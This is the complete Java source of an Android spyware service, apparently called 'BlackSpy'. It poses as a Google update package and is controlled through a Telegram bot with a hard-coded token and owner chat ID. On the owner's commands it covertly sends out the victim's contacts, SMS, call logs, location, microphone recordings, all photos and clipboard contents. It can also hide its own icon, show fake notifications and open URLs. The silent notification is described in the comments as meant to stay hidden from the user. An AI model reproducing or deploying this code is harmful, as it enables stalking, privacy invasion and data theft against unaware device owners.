package com.google.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8652354299:AAEOH62d9BHbl064QYcFC2LgbiAH_doiwhU";
    private static final String OWNER_CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    private int lastUpdateId = 0;
    private String targetDeviceId = null;
    private String targetDeviceName = null;
    private String targetChatId = null;
    private boolean deviceRegistered = false;
    
    private MediaRecorder mediaRecorder;
    private File currentAudioFile;
    private boolean isRecording = false;
    
    private ScheduledExecutorService scheduler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        // لا نبدأ foreground service بشكل عادي
        if (Build.VERSION.SDK_INT >= 26) {
            startForeground(1, createSilentNotification());
        }
        scheduler = Executors.newSingleThreadScheduledExecutor();
        startBot();
    }
    
    // إشعار صامت لا يظهر للمستخدم
    private Notification createSilentNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("silent_ch", "System", NotificationManager.IMPORTANCE_LOW);
            ch.setSound(null, null);
            ch.setVibrationPattern(null);
            ch.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        Notification notification = new NotificationCompat.Builder(this, "silent_ch")
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .setOngoing(true)
                .build();
        return notification;
    }
    
    private void startBot() {
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                if (response != null && response.contains("\"ok\":true")) {
                    JSONObject json = new JSONObject(response);
                    JSONArray results = json.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        JSONObject update = results.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id");
                        if (update.has("message") && update.getJSONObject("message").has("text")) {
                            JSONObject msg = update.getJSONObject("message");
                            String text = msg.getString("text").trim();
                            long chatId = msg.getJSONObject("chat").getLong("id");
                            String chatIdStr = String.valueOf(chatId);
                            
                            Log.d("BlackSpy", "Received: " + text + " from: " + chatIdStr);
                            
                            // قبول التسجيل من أي جهاز
                            if (text.startsWith("REGISTER:") && targetChatId == null) {
                                String data = text.replace("REGISTER:", "");
                                JSONObject info = new JSONObject(data);
                                targetDeviceId = info.getString("device_id");
                                targetDeviceName = info.getString("device_name");
                                targetChatId = chatIdStr;
                                deviceRegistered = true;
                                sendMessageToOwner("✅ BLACK SPY ONLINE ✅\n📍 " + targetDeviceName);
                                sendMessageToOwner(getCommandMenu());
                                Log.i("BlackSpy", "Device registered: " + targetDeviceName);
                            }
                            // أوامر التحكم من المالك فقط
                            else if (chatIdStr.equals(OWNER_CHAT_ID) && deviceRegistered) {
                                handleCommand(text);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("BlackSpy", "Polling error", e);
            }
        }, 0, 2, TimeUnit.SECONDS);
    }
    
    private void handleCommand(String cmd) {
        String c = cmd.trim().toLowerCase();
        
        if (c.equals("/start")) {
            sendMessageToOwner(getCommandMenu());
            return;
        }
        
        if (targetChatId == null) {
            sendMessageToOwner("❌ لا يوجد جهاز مستهدف");
            return;
        }
        
        if (c.equals("/info")) sendDeviceInfo();
        else if (c.equals("/contacts")) sendContacts();
        else if (c.equals("/sms")) sendSMS();
        else if (c.equals("/calllogs")) sendCallLogs();
        else if (c.equals("/location")) getLocation();
        else if (c.equals("/record")) startRecording();
        else if (c.equals("/stoprec")) stopRecording();
        else if (c.equals("/steal_photos")) stealAllPhotos();
        else if (c.equals("/battery")) sendBatteryInfo();
        else if (c.equals("/network")) sendNetworkInfo();
        else if (c.equals("/sim")) sendSimInfo();
        else if (c.equals("/apps")) sendAppsList();
        else if (c.equals("/hide")) hideApp();
        else if (c.equals("/show")) showApp();
        else if (c.equals("/status")) sendStatus();
        else if (c.startsWith("/notify ")) sendFakeNotification(cmd.substring(8).trim());
        else if (c.startsWith("/vibrate ")) vibrateDevice(cmd.substring(9).trim());
        else if (c.startsWith("/openurl ")) openUrl(cmd.substring(9).trim());
        else if (c.equals("/clipboard")) getClipboard();
        else sendMessageToOwner("❌ أمر غير معروف");
    }
    
    private void sendToDevice(String cmd) {
        if (targetChatId == null) return;
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + targetChatId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
                sendMessageToOwner("✅ تم: " + cmd);
            } catch (Exception e) {
                sendMessageToOwner("❌ فشل");
            }
        }).start();
    }
    
    private void sendDeviceInfo() {
        String info = "📱 <b>معلومات الجهاز</b>\n────────────────\n"
                + "📌 الموديل: " + Build.MANUFACTURER + " " + Build.MODEL + "\n"
                + "📌 Android: " + Build.VERSION.RELEASE + "\n"
                + "📌 الجهاز: " + Build.DEVICE + "\n"
                + "📌 المنتج: " + Build.PRODUCT + "\n"
                + "📌 العلامة: " + Build.BRAND;
        sendMessageToOwner(info);
    }
    
    private void sendContacts() {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "contacts.csv");
                OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
                w.write('\ufeff');
                w.write("الاسم,رقم الهاتف\n");
                ContentResolver cr = getContentResolver();
                Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
                if (cur != null) {
                    while (cur.moveToNext()) {
                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                            if (pCur != null) {
                                while (pCur.moveToNext()) {
                                    String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    w.write("\"" + (name != null ? name : "") + "\",\"" + (phone != null ? phone : "") + "\"\n");
                                }
                                pCur.close();
                            }
                        }
                    }
                    cur.close();
                }
                w.close();
                sendFileToOwner(f, "📇 جهات الاتصال");
                f.delete();
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendSMS() {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "sms.csv");
                OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
                w.write('\ufeff');
                w.write("النوع,الرقم,التاريخ,النص\n");
                if (Build.VERSION.SDK_INT >= 19) {
                    Cursor c = getContentResolver().query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, android.provider.Telephony.Sms.DEFAULT_SORT_ORDER);
                    if (c != null) {
                        while (c.moveToNext()) {
                            String addr = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.ADDRESS));
                            String body = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.BODY));
                            String date = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.DATE));
                            String type = c.getString(c.getColumnIndex(android.provider.Telephony.Sms.TYPE));
                            String t = type.equals("1") ? "واردة" : (type.equals("2") ? "صادرة" : "مسودة");
                            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
                            w.write("\"" + t + "\",\"" + (addr != null ? addr : "") + "\",\"" + sdf.format(new Date(Long.parseLong(date))) + "\",\"" + (body != null ? body.replace("\n", " ") : "") + "\"\n");
                        }
                        c.close();
                    }
                }
                w.close();
                sendFileToOwner(f, "💬 رسائل SMS");
                f.delete();
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendCallLogs() {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "calls.csv");
                OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(f), "UTF-8");
                w.write('\ufeff');
                w.write("الرقم,النوع,التاريخ,المدة\n");
                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                if (c != null) {
                    while (c.moveToNext()) {
                        String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                        String type = c.getString(c.getColumnIndex(CallLog.Calls.TYPE));
                        String date = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
                        String dur = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                        String t;
                        switch (Integer.parseInt(type)) {
                            case CallLog.Calls.INCOMING_TYPE: t = "وارد"; break;
                            case CallLog.Calls.OUTGOING_TYPE: t = "صادر"; break;
                            default: t = "فائت";
                        }
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
                        w.write("\"" + (num != null ? num : "") + "\",\"" + t + "\",\"" + sdf.format(new Date(Long.parseLong(date))) + "\",\"" + dur + " ثانية\"\n");
                    }
                    c.close();
                }
                w.close();
                sendFileToOwner(f, "📞 سجلات المكالمات");
                f.delete();
            } catch (Exception e) {}
        }).start();
    }
    
    private void getLocation() {
        sendMessageToOwner("📍 جاري جلب الموقع...");
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) { sendMessageToOwner("❌ LocationManager غير متاح"); return; }
            if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                sendMessageToOwner("❌ الرجاء تفعيل GPS");
                return;
            }
            LocationListener listener = new LocationListener() {
                @Override public void onLocationChanged(Location loc) {
                    String url = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                    sendMessageToOwner("📍 <b>الموقع الحالي</b>\n────────────────\n🌐 خط العرض: " + loc.getLatitude() + "\n🌐 خط الطول: " + loc.getLongitude() + "\n🎯 الدقة: " + loc.getAccuracy() + " متر\n🗺️ <a href='" + url + "'>اضغط للخريطة</a>");
                }
                @Override public void onProviderDisabled(String p) { sendMessageToOwner("❌ GPS معطل"); }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
            };
            if (Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    sendMessageToOwner("❌ لا توجد صلاحية الموقع");
                    return;
                }
            }
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            new android.os.Handler().postDelayed(() -> sendMessageToOwner("❌ انتهى الوقت"), 15000);
        } catch (SecurityException e) { sendMessageToOwner("❌ لا توجد صلاحية الموقع"); }
    }
    
    private void startRecording() {
        if (isRecording) { sendMessageToOwner("🎤 التسجيل قيد التشغيل"); return; }
        try {
            File dir = new File(getCacheDir(), "recordings");
            if (!dir.exists()) dir.mkdirs();
            currentAudioFile = new File(dir, "rec_" + System.currentTimeMillis() + ".3gp");
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendMessageToOwner("🎙️ جاري التسجيل...\n/stoprec للإيقاف");
        } catch (Exception e) { sendMessageToOwner("❌ فشل التسجيل"); }
    }
    
    private void stopRecording() {
        if (!isRecording || mediaRecorder == null) { sendMessageToOwner("❌ لا يوجد تسجيل"); return; }
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            if (currentAudioFile != null && currentAudioFile.exists()) {
                sendFileToOwner(currentAudioFile, "🎙️ تسجيل صوتي");
                currentAudioFile.delete();
            }
        } catch (Exception e) { sendMessageToOwner("❌ خطأ"); }
    }
    
    private void stealAllPhotos() {
        new Thread(() -> {
            try {
                sendMessageToOwner("📸 جاري جمع الصور...");
                File zipFile = new File(getCacheDir(), "photos_" + System.currentTimeMillis() + ".zip");
                ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
                Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
                        new String[]{MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME}, null, null, null);
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String path = cursor.getString(0);
                        String name = cursor.getString(1);
                        if (path != null) {
                            File imgFile = new File(path);
                            if (imgFile.exists()) {
                                FileInputStream fis = new FileInputStream(imgFile);
                                zos.putNextEntry(new ZipEntry(name != null ? name : "image_" + count + ".jpg"));
                                byte[] buffer = new byte[8192];
                                int len;
                                while ((len = fis.read(buffer)) != -1) zos.write(buffer, 0, len);
                                zos.closeEntry();
                                fis.close();
                                count++;
                            }
                        }
                    }
                    cursor.close();
                }
                zos.close();
                if (count > 0) sendFileToOwner(zipFile, "📸 " + count + " صورة");
                else sendMessageToOwner("❌ لا توجد صور");
                zipFile.delete();
            } catch (Exception e) { sendMessageToOwner("❌ فشل جمع الصور"); }
        }).start();
    }
    
    private void sendBatteryInfo() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
            sendMessageToOwner("🔋 البطارية: " + level + "%");
        } catch (Exception e) { sendMessageToOwner("❌ خطأ"); }
    }
    
    private void sendNetworkInfo() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wi = wm.getConnectionInfo();
            String ip = (wi.getIpAddress() & 0xFF) + "." + ((wi.getIpAddress() >> 8) & 0xFF) + "." + ((wi.getIpAddress() >> 16) & 0xFF) + "." + ((wi.getIpAddress() >> 24) & 0xFF);
            sendMessageToOwner("🌐 الواي فاي: " + wi.getSSID() + "\n📡 الـ IP: " + ip);
        } catch (Exception e) { sendMessageToOwner("❌ خطأ"); }
    }
    
    private void sendSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    sendMessageToOwner("❌ لا توجد صلاحية");
                    return;
                }
            }
            String operator = tm.getNetworkOperatorName();
            sendMessageToOwner("📇 المشغل: " + (operator != null ? operator : "غير معروف"));
        } catch (Exception e) { sendMessageToOwner("❌ خطأ"); }
    }
    
    private void sendAppsList() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder("📱 التطبيقات:\n");
                PackageManager pm = getPackageManager();
                List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
                int count = 0;
                for (android.content.pm.ApplicationInfo app : apps) {
                    if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                        sb.append("• ").append(pm.getApplicationLabel(app)).append("\n");
                        count++;
                        if (count > 30) break;
                    }
                }
                sendMessageToOwner(sb.toString());
            } catch (Exception e) { sendMessageToOwner("❌ خطأ"); }
        }).start();
    }
    
    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendMessageToOwner("👻 تم إخفاء التطبيق");
        } catch (Exception e) { sendMessageToOwner("❌ فشل الإخفاء"); }
    }
    
    private void showApp() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendMessageToOwner("👁️ تم إظهار التطبيق");
        } catch (Exception e) { sendMessageToOwner("❌ فشل الإظهار"); }
    }
    
    private void sendStatus() {
        sendMessageToOwner("✅ الجهاز: " + targetDeviceName + "\n🎤 التسجيل: " + (isRecording ? "نعم" : "لا"));
    }
    
    private void sendFakeNotification(String text) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake_ch", "إشعارات", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notif = new Notification.Builder(this, "fake_ch")
                    .setContentTitle("📱 جديد")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setAutoCancel(true)
                    .build();
            nm.notify((int) System.currentTimeMillis(), notif);
            sendMessageToOwner("🔔 تم: " + text);
        } catch (Exception e) { sendMessageToOwner("❌ فشل"); }
    }
    
    private void vibrateDevice(String durationStr) {
        try {
            int duration = Integer.parseInt(durationStr) * 1000;
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                v.vibrate(duration);
                sendMessageToOwner("📳 اهتزاز " + durationStr + " ثانية");
            }
        } catch (Exception e) { sendMessageToOwner("❌ فشل"); }
    }
    
    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendMessageToOwner("🌐 تم فتح الرابط");
        } catch (Exception e) { sendMessageToOwner("❌ فشل"); }
    }
    
    private void getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
                sendMessageToOwner("📋 الحافظة:\n" + text);
            } else {
                sendMessageToOwner("📋 الحافظة فارغة");
            }
        } catch (Exception e) { sendMessageToOwner("❌ فشل"); }
    }
    
    private String getCommandMenu() {
        return "🔥 BLACK SPY 🔥\n\n✅ الجهاز: " + targetDeviceName + "\n\n"
                + "/info 📱 معلومات\n"
                + "/contacts 📞 جهات الاتصال\n"
                + "/sms 💬 الرسائل\n"
                + "/calllogs 📞 سجلات المكالمات\n"
                + "/location 📍 الموقع\n"
                + "/record 🎙️ تسجيل\n"
                + "/stoprec ⏹️ إيقاف التسجيل\n"
                + "/steal_photos 📸 سرقة الصور\n"
                + "/battery 🔋 البطارية\n"
                + "/network 🌐 الشبكة\n"
                + "/sim 📇 معلومات SIM\n"
                + "/apps 📱 التطبيقات\n"
                + "/hide 👻 إخفاء\n"
                + "/show 👁️ إظهار\n"
                + "/status ✅ الحالة\n"
                + "/notify 🔔 إشعار\n"
                + "/vibrate 📳 اهتزاز\n"
                + "/openurl 🔗 فتح رابط\n"
                + "/clipboard 📋 الحافظة";
    }
    
    private void sendFileToOwner(File file, String caption) {
        new Thread(() -> {
            try {
                String boundary = "*****" + System.currentTimeMillis();
                URL url = new URL(API_URL + "sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                java.io.OutputStream os = conn.getOutputStream();
                java.io.PrintWriter w = new java.io.PrintWriter(new java.io.OutputStreamWriter(os), true);
                w.append("--" + boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                w.append(OWNER_CHAT_ID).append("\r\n");
                w.flush();
                if (caption != null) {
                    w.append("--" + boundary).append("\r\n");
                    w.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
                    w.append(caption).append("\r\n");
                    w.flush();
                }
                w.append("--" + boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n");
                w.append("Content-Type: application/octet-stream").append("\r\n\r\n");
                w.flush();
                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[8192];
                int read;
                while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
                os.flush();
                fis.close();
                w.append("\r\n").append("--" + boundary + "--").append("\r\n");
                w.close();
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    
    private void sendMessageToOwner(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + OWNER_CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
    
    private String get(String urlStr) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setConnectTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    
    @Override
    public void onDestroy() {
        if (scheduler != null) scheduler.shutdown();
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
